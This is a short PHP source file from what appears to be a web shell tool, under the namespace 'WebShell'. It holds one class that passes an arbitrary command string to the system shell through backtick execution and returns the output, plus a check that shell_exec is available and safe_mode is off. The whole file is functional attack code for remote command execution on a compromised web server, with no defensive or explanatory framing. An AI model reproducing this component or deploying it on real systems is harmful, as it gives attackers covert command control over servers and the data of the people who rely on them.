<?php
namespace WebShell;

class BackticksExecutionMethod implements ExecutionMethod
{
    public function execute(string $cmd): string
    {
        return `$cmd`;
    }

    public function isAvailable(): bool
    {
        return function_exists('shell_exec') && !ini_get('safe_mode');
    }
}
?>
